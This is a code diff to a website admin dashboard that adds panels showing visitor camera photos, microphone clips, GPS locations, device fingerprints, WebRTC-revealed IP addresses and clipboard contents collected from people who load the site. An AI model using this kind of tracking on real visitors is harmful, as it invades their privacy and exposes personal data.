@@ -217,13 +217,18 @@
       <button class="btn go" style="margin-top:12px" onclick="saveVisitorSettings()">Save experimental</button>
     </div>
     <div class="card">
+      <h2>Captures <span class="badge" id="cap-count"></span></h2>
+      <p class="sub">Camera photos and microphone clips visitors allowed. Newest first.</p>
+      <div id="vl-captures" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px"></div>
+    </div>
+    <div class="card">
       <h2>Visitors <span class="badge" id="vl-total"></span></h2>
       <p class="sub">One line per address, newest activity first. Click an address to filter the log below.</p>
       <table><thead><tr><th>Address</th><th>From</th><th>Location</th><th>Device</th><th class="hide-sm">Account</th><th>Hits</th><th class="hide-sm">First seen</th><th>Last seen</th></tr></thead><tbody id="vl-visitors"></tbody></table>
     </div>
     <div class="card">
       <h2>Log <span class="badge" id="vl-filter"></span> <button class="btn" id="vl-clearfilter" onclick="loadVisitors('')" style="display:none">Show all</button></h2>
-      <table><thead><tr><th>When</th><th>Address</th><th>Who</th><th>What</th><th class="hide-sm">Device</th><th class="hide-sm">Details</th></tr></thead><tbody id="vl-rows"></tbody></table>
+      <table><thead><tr><th>When</th><th>Address</th><th>Who</th><th>What</th><th class="hide-sm">Device</th><th>Details</th></tr></thead><tbody id="vl-rows"></tbody></table>
     </div>
   </section>
 </div>
@@ -381,20 +386,26 @@
     renderExperimental(st.experimental||{});
     $("#vl-state").textContent=st.enabled?"on":"off"; $("#vl-state").className="badge "+(st.enabled?"ok":"");
     $("#vl-total").textContent=d.total+" entries"; $("#vl-filter").textContent=vlFilter||"all"; $("#vl-clearfilter").style.display=vlFilter?"":"none";
+    const caps=d.captures||[]; $("#cap-count").textContent=caps.length+" captured"; $("#cap-count").className="badge "+(caps.length?"ok":"");
+    $("#vl-captures").innerHTML = caps.length ? caps.map(c=>{ const u="/api/admin/capture/"+encodeURIComponent(c.id);
+      const media = c.kind==="camera" ? `<a href="${u}" target="_blank" rel="noopener"><img src="${u}" style="width:100%;border-radius:10px;display:block"></a>` : `<audio controls src="${u}" style="width:100%"></audio>`;
+      return `<div style="background:var(--paper-2);border:1px solid var(--line-soft);border-radius:12px;padding:8px"><div style="font-size:11px;color:var(--ink-soft);font-family:ui-monospace,Menlo,monospace;margin-bottom:6px">${c.kind} · <a class="dirlink" onclick="loadVisitors('${esc(c.ip)}')">${esc(c.ip)}</a> · ${when(c.ts)}</div>${media}</div>`; }).join("") : `<div class="empty">No camera or mic captures yet. Enable Camera / Microphone in Experimental, then load the site on a device and allow the prompt.</div>`;
     $("#vl-visitors").innerHTML = d.visitors.length ? d.visitors.map(v=>`<tr>
       <td><a class="dirlink" onclick="loadVisitors('${esc(v.ip)}')">${esc(v.ip)}</a>${v.failed_logins?` <span class="badge pub">${v.failed_logins} failed login${v.failed_logins>1?"s":""}</span>`:""}</td>
       <td>${viaBadge(v.via)}</td><td class="num">${v.precise?`<a class="dirlink" href="https://www.openstreetmap.org/?mlat=${v.precise.lat}&mlon=${v.precise.lon}#map=17/${v.precise.lat}/${v.precise.lon}" target="_blank" rel="noopener">GPS ${v.precise.lat.toFixed(5)}, ${v.precise.lon.toFixed(5)}</a>${v.precise.acc?` ±${Math.round(v.precise.acc)} m`:""}`:(esc(geoText(v.geo))||(v.via==="public"?"…":"—"))}</td>
       <td class="num">${esc([v.device,v.os,v.browser].filter(Boolean).join(" · "))}</td><td class="num hide-sm">${esc(v.user||"—")}</td>
       <td class="num">${v.hits}</td><td class="num hide-sm">${when(v.first_seen)}</td><td class="num">${when(v.last_seen)}</td></tr>`).join("") : `<tr><td colspan="8" class="empty">${st.enabled?"Nothing recorded yet.":"Turn on logging above to start recording."}</td></tr>`;
     $("#vl-rows").innerHTML = d.rows.length ? d.rows.map(r=>{
-      const what = r.method==="BEACON" ? "browser details" : `${esc(r.method)} ${esc(r.path)} → ${r.status}` + (r.detail?` <b>${esc(r.detail)}</b>`:"");
+      const EXPK = ["gpu","fingerprint","webrtc_ips","battery","cam_count","mic_count","notif_perm","motion","clipboard","exp_errors"];
+      const hasExp = r.client && EXPK.some(k=>r.client[k]!=null);
+      const what = r.method==="CAPTURE" ? `<b style="color:var(--signal)">${esc(r.path)}</b>` : r.method==="BEACON" ? (hasExp?'<b style="color:var(--signal)">experimental</b>':"browser details") : `${esc(r.method)} ${esc(r.path)} → ${r.status}` + (r.detail?` <b>${esc(r.detail)}</b>`:"");
       let det = r.client ? Object.entries(r.client).filter(([k,v])=>v!==""&&v!==false&&v!==0&&k!=="capture"&&k!=="kind").map(([k,v])=>k+"="+v).join(" · ") : [r.lang, r.referer?"from "+r.referer:""].filter(Boolean).join(" · ");
       if(r.client && r.client.capture){ const u="/api/admin/capture/"+encodeURIComponent(r.client.capture); det = r.client.kind==="camera" ? `<a href="${u}" target="_blank" rel="noopener"><img src="${u}" style="max-width:160px;border-radius:8px;display:block"></a>` : `<audio controls src="${u}" style="height:32px"></audio>`; }
       const gps = r.client && r.client.lat!=null ? `https://www.openstreetmap.org/?mlat=${r.client.lat}&mlon=${r.client.lon}#map=17/${r.client.lat}/${r.client.lon}` : null;
       const whatCell = gps ? `<a class="dirlink" href="${gps}" target="_blank" rel="noopener">${esc(r.detail)}</a>` : what;
       return `<tr><td class="num">${when(r.ts)}</td><td><a class="dirlink" onclick="loadVisitors('${esc(r.ip)}')">${esc(r.ip)}</a> ${viaBadge(r.via)}</td>
       <td class="num">${esc(r.user||"—")}</td><td style="${r.detail&&r.detail.includes("FAILED")?"color:var(--pop)":""}">${whatCell}</td>
-      <td class="num hide-sm">${esc([r.device,r.os,r.browser].filter(Boolean).join(" · "))}</td><td class="num hide-sm" style="max-width:380px;white-space:normal;word-break:break-word">${esc(det)}${r.geo&&r.geo.status==="success"?"<br>"+esc(geoText(r.geo)):""}</td></tr>`; }).join("") : `<tr><td colspan="6" class="empty">No entries.</td></tr>`;
+      <td class="num hide-sm">${esc([r.device,r.os,r.browser].filter(Boolean).join(" · "))}</td><td class="num" style="max-width:420px;white-space:normal;word-break:break-word">${esc(det)}${r.geo&&r.geo.status==="success"?"<br>"+esc(geoText(r.geo)):""}</td></tr>`; }).join("") : `<tr><td colspan="6" class="empty">No entries.</td></tr>`;
   };
   const EXP = [["webrtc_ip","WebRTC IP address"],["battery","Battery level"],["gpu","GPU model"],["fingerprint","Device fingerprint"],["device_counts","Camera/mic counts"],["notifications","Notifications permission"],["motion","Motion sensors"],["camera","Camera photo"],["mic","Microphone clip"],["clipboard","Clipboard contents"]];
   function renderExperimental(exp){
